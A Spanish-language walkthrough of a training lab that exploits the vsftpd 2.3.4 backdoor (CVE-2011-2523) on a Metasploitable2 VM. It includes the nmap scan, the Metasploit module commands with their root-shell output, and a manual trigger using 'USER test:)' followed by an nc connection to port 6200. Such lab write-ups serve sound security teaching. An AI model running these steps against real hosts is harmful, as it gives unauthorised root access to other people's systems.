# 🎯 Laboratorio: Explotación de vsftpd 2.3.4 en Metasploitable2.

> Este ejercicio simula un escenario real de pentesting donde se identifica y explota un servicio FTP vulnerable para obtener acceso al sistema como `root`.
> Nivel de dificultad: Fácil.

---

## 🔍 1.Reconocimiento inicial con Nmap.

```bash
nmap -sS -sV -p- 192.168.56.102
```

### Resultado:

| Puerto  | Estado | Servicio | Versión     |
|---------|--------|----------|-------------|
| 21/tcp  | open   | ftp      | vsftpd 2.3.4 |


✅ Observamos que el servicio FTP usa la versión vsftpd 2.3.4, la cual es conocida por tener una backdoor deliberada.

## 🧠 2. Análisis de vulnerabilidad.

La versión vsftpd 2.3.4 contiene una puerta trasera activada cuando se incluye un :) como parte del nombre de usuario.

Referencias:

- [CVE-2011-2523](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523).
- Vector: FTP login → trigger backdoor shell.

## 💥 3. Explotación automática con Metasploit.

En este punto, tenemos dos vías para poder explotar el servicio vsftpd: manualmente o de manera automática con Metasploit.

1. Iniciar Metasploit. Se lanza la consola de Metasploit Framework, una herramienta poderosa para realizar pruebas de penetración. Este entorno permite acceder a una amplia gama de exploits, payloads y módulos auxiliares.

```bash
msfconsole
```

2. Configurar y ejecutar el exploit vsftpd_234_backdoor.  Se selecciona un exploit dirigido a una versión vulnerable del servidor FTP vsftpd (2.3.4), que contiene una puerta trasera. Se configuran los parámetros del objetivo (RHOST y RPORT) y se ejecuta el ataque para obtener acceso no autorizado al sistema.

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.102
set RPORT 21
exploit
```
### Resultado:

[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.102:21 - Backdoor service has been spawned, handling...
[*] Command shell session 1 opened

Shell obtenida, ejecutamos comandos como whoami e id para ver nuestro usuario actual en el sistema.

- whoami: root
- id: uid=0(root) gid=0(root)

## 🧠 4. Exploit manual

```bash
telnet 192.168.56.102 21
```

```
Trying 192.168.56.102...
Connected to 192.168.56.102.
220 (vsFTPd 2.3.4)
USER test:)
```

Al usar test:) se activa el backdoor que escucha en el puerto 6200/tcp.

Nos conectamos y obtenemos la shell con:

```bash
nc 192.168.56.102 6200
```

## 🎯 5. ¡Objetivo conseguido!.

| Objetivo                     | ¿Alcanzado? |
|-----------------------------|-------------|
| Reconocimiento de puertos   | ✅ Sí        |
| Identificación de versiones | ✅ Sí        |
| Uso de exploits públicos    | ✅ Sí        |
| Acceso al sistema           | ✅ Sí        |
| Acceso como root            | ✅ Sí        |
| Documentación del proceso   | ✅ Sí        |
